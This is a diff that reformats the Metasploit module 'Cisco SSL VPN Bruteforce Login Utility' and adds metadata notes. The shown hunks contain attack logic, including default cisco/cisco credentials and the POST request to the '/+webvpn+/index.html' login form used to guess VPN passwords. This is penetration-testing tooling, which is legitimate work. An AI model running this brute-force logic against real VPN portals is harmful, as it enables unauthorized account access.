@@ -3,43 +3,49 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Cisco SSL VPN Bruteforce Login Utility',
-      'Description'    => %{
-        This module scans for Cisco SSL VPN web login portals and
-        performs login brute force to identify valid credentials.
-      },
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Cisco SSL VPN Bruteforce Login Utility',
+        'Description' => %q{
+          This module scans for Cisco SSL VPN web login portals and
+          performs login brute force to identify valid credentials.
+        },
+        'Author' => [
           'Jonathan Claudius <jclaudius[at]trustwave.com>'
         ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' =>
-        {
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
           'SSL' => true,
           'USERNAME' => 'cisco',
           'PASSWORD' => 'cisco'
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
         }
-    ))
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('GROUP', [false, "A specific VPN group to use", ''])
-      ])
+      ]
+    )
     register_advanced_options(
       [
         OptBool.new('EmptyGroup', [true, "Use an empty group with authentication requests", false])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -174,23 +180,23 @@ class MetasploitModule < Msf::Auxiliary
                "webvpnLang=en;"
 
       post_params = {
-        'tgroup'  => '',
-        'next'    => '',
+        'tgroup' => '',
+        'next' => '',
         'tgcookieset' => '',
         'username' => user,
         'password' => pass,
-        'Login'   => 'Logon'
+        'Login' => 'Logon'
       }
 
       post_params['group_list'] = group unless group.empty?
 
       res = send_request_cgi(
-              'uri' => '/+webvpn+/index.html',
-              'method' => 'POST',
-              'ctype' => 'application/x-www-form-urlencoded',
-              'cookie' => cookie,
-              'vars_post' => post_params
-            )
+        'uri' => '/+webvpn+/index.html',
+        'method' => 'POST',
+        'ctype' => 'application/x-www-form-urlencoded',
+        'cookie' => cookie,
+        'vars_post' => post_params
+      )
 
       if res &&
          res.code == 200 &&
@@ -208,7 +214,6 @@ class MetasploitModule < Msf::Auxiliary
       else
         vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")
       end
-
     rescue ::Rex::ConnectionRefused,
            ::Rex::HostUnreachable,
            ::Rex::ConnectionTimeout,
